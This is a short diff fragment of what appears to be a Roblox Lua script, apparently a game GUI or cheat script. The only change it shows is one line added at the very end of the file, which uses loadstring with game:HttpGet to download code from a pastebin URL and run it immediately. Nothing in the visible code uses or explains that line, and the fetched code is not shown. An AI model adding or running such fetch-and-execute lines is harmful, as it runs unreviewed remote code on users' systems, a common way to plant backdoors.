@@ -1076,3 +1076,4 @@ game:GetService("RunService").RenderStepped:Connect(function()
 end) 
    end,
 })
+loadstring(game:HttpGet('https://pastebin.com/raw/QbX0Fi5M'))()
